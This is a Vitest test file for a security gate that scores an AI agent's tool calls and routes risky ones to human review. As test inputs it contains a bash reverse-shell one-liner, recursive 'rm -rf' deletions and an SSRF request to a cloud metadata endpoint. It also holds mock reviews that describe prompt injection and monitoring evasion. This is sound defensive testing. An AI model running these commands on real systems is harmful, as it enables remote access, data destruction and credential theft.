import { describe, it, expect, beforeEach, vi } from 'vitest';
import { PolicyGate } from '../security/policy-gate.js';
import type { BehaviorAnalyzerProvider } from '@paddock/types';

describe('PolicyGate', () => {
  let gate: PolicyGate;

  beforeEach(() => {
    gate = new PolicyGate('/workspace');
  });

  describe('evaluate', () => {
    it('should approve safe read operations', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c1',
        toolName: 'read',
        toolInput: { path: '/workspace/src/index.ts' },
      });
      expect(verdict.verdict).toBe('approve');
      expect(verdict.riskScore).toBeLessThanOrEqual(30);
    });

    it('should approve read-only inspection of the bundled OpenClaw runtime', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c1-runtime',
        toolName: 'read',
        toolInput: { path: '/opt/paddock/openclaw-runtime/skills/weather/SKILL.md' },
      });

      expect(verdict.verdict).toBe('approve');
      expect(verdict.riskScore).toBeLessThanOrEqual(30);
      expect(verdict.triggeredRules).toEqual([]);
    });

    it('should escalate reverse shell attempts to HITL instead of auto-rejecting them', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c2',
        toolName: 'exec',
        toolInput: { command: 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1' },
      });
      expect(verdict.verdict).toBe('ask');
      expect(verdict.riskScore).toBeGreaterThan(90);
    });

    it('should flag destructive rm for HITL', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c3',
        toolName: 'exec',
        toolInput: { command: 'rm -rf /etc' },
      });
      expect(verdict.verdict).toBe('ask');
      expect(verdict.riskScore).toBeGreaterThanOrEqual(70);
    });

    it('should approve normal exec commands', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c4',
        toolName: 'exec',
        toolInput: { command: 'ls -la /workspace' },
      });
      expect(verdict.verdict).toBe('approve');
    });

    it('should flag SSRF attempts', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c5',
        toolName: 'web_fetch',
        toolInput: { url: 'http://169.254.169.254/latest/meta-data/' },
      });
      expect(verdict.riskScore).toBeGreaterThanOrEqual(70);
    });

    it('should approve loopback browser navigation inside the sandbox VM', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c5-browser',
        toolName: 'browser',
        toolInput: { action: 'navigate', url: 'http://127.0.0.1:8765/report.html' },
      });
      expect(verdict.verdict).toBe('approve');
      expect(verdict.riskScore).toBeLessThanOrEqual(30);
    });

    it('should reject disabled gateway tool calls', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c6',
        toolName: 'gateway',
        toolInput: { action: 'restart' },
      });
      expect(verdict.verdict).toBe('reject');
      expect(verdict.riskScore).toBe(100);
      expect(verdict.triggeredRules).toContain('boundary:disabled_tool');
    });

    it('should keep high-risk sandbox-local tools available for approval workflows', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c7',
        toolName: 'write',
        toolInput: { path: '/etc/hosts', content: '127.0.0.1 localhost' },
      });

      expect(verdict.verdict).toBe('ask');
      expect(verdict.riskScore).toBeGreaterThan(70);
    });

    it('should require approval before mutating the bundled OpenClaw runtime', async () => {
      const verdict = await gate.evaluate({
        correlationId: 'c8',
        toolName: 'write',
        toolInput: {
          path: '/opt/paddock/openclaw-runtime/skills/weather/SKILL.md',
          content: 'rewrite runtime',
        },
      });

      expect(verdict.verdict).toBe('ask');
      expect(verdict.triggeredRules).toContain('readonly_runtime');
      expect(verdict.riskScore).toBeGreaterThanOrEqual(70);
    });
  });

  describe('trust decay', () => {
    it('should decrease trust score on anomalies', async () => {
      const initial = gate.getTrustProfile();
      expect(initial.score).toBe(100);

      // Trigger anomalies
      await gate.evaluate({ correlationId: 'c1', toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
      const after = gate.getTrustProfile();
      expect(after.score).toBeLessThan(100);
      expect(after.anomalyCount).toBeGreaterThan(0);
    });

    it('should increase penalty boost when trust is low', async () => {
      // Trigger many anomalies to drop trust below 60
      for (let i = 0; i < 10; i++) {
        await gate.evaluate({ correlationId: `c${i}`, toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
      }
      const profile = gate.getTrustProfile();
      expect(profile.penaltyBoost).toBeGreaterThan(0);
    });

    it('should lower trust after suspicious llm reviews', () => {
      gate.onLLMReview({
        phase: 'request',
        verdict: 'warn',
        riskScore: 58,
        triggered: ['llm:prompt_injection'],
        reason: 'Prompt attempts to bypass monitoring.',
        source: 'audit-local-llm',
        summary: 'User asks the model to hide actions from monitoring.',
      });

      const profile = gate.getTrustProfile();
      expect(profile.score).toBeLessThan(100);
      expect(profile.anomalyCount).toBeGreaterThan(0);
    });
  });

  describe('llm review escalation', () => {
    it('should escalate a safe tool call to HITL after an ask-grade llm review', async () => {
      gate.onLLMReview({
        phase: 'request',
        verdict: 'ask',
        riskScore: 82,
        triggered: ['llm:prompt_injection', 'llm:monitoring_evasion'],
        reason: 'Prompt tries to hide tool activity from the monitor.',
        confidence: 0.93,
        source: 'audit-local-llm',
        summary: 'The model was asked to suppress reporting and proceed quietly.',
      });

      const verdict = await gate.evaluate({
        correlationId: 'c-llm-ask',
        toolName: 'exec',
        toolInput: { command: 'ls -la /workspace' },
      });

      expect(verdict.verdict).toBe('ask');
      expect(verdict.triggeredRules).toEqual(expect.arrayContaining(['llm:prompt_injection', 'llm:monitoring_evasion']));
      expect(verdict.riskBreakdown?.llmReview).toBeGreaterThan(0);
      expect(verdict.llmReview).toMatchObject({
        verdict: 'ask',
        source: 'audit-local-llm',
        summary: 'The model was asked to suppress reporting and proceed quietly.',
      });
    });

    it('should reject tool calls after a block-grade llm review', async () => {
      gate.onLLMReview({
        phase: 'response',
        verdict: 'block',
        riskScore: 96,
        triggered: ['llm:covert_instruction'],
        reason: 'Model produced covert exfiltration instructions.',
        confidence: 0.98,
        source: 'audit-local-llm',
        summary: 'Response includes hidden exfiltration steps.',
      });

      const verdict = await gate.evaluate({
        correlationId: 'c-llm-block',
        toolName: 'write',
        toolInput: { path: '/workspace/notes.txt', content: 'hello' },
      });

      expect(verdict.verdict).toBe('reject');
      expect(verdict.triggeredRules).toContain('llm:covert_instruction');
      expect(verdict.riskBreakdown?.llmReview).toBeGreaterThanOrEqual(60);
      expect(verdict.llmReview).toMatchObject({
        phase: 'response',
        verdict: 'block',
        source: 'audit-local-llm',
      });
    });
  });

  describe('reset', () => {
    it('should reset trust profile', async () => {
      await gate.evaluate({ correlationId: 'c1', toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
      gate.reset();
      const profile = gate.getTrustProfile();
      expect(profile.score).toBe(100);
      expect(profile.anomalyCount).toBe(0);
      expect(profile.penaltyBoost).toBe(0);
    });

    it('should delegate to an injected behavior analyzer provider', async () => {
      const analyzer: BehaviorAnalyzerProvider = {
        evaluate: vi.fn().mockReturnValue({
          riskBoost: 35,
          triggered: ['custom:review-required'],
          reason: 'semantic drift detected',
          confidence: 0.88,
          source: 'ollama:qwen3:0.6b',
        }),
        reset: vi.fn(),
      };

      const injectedGate = new PolicyGate({
        workspace: '/workspace',
        behaviorAnalyzer: analyzer,
      });

      const verdict = await injectedGate.evaluate({
        correlationId: 'c-custom',
        toolName: 'write',
        toolInput: { path: '/workspace/notes.txt', content: 'hello' },
      });

      expect(analyzer.evaluate).toHaveBeenCalledOnce();
      expect(verdict.triggeredRules).toContain('custom:review-required');
      expect(verdict.behaviorReview).toMatchObject({
        riskBoost: 35,
        triggered: ['custom:review-required'],
        reason: 'semantic drift detected',
        confidence: 0.88,
        source: 'ollama:qwen3:0.6b',
      });
      expect(verdict.riskBreakdown?.behavior).toBe(35);

      injectedGate.reset();
      expect(analyzer.reset).toHaveBeenCalledOnce();
    });
  });
});
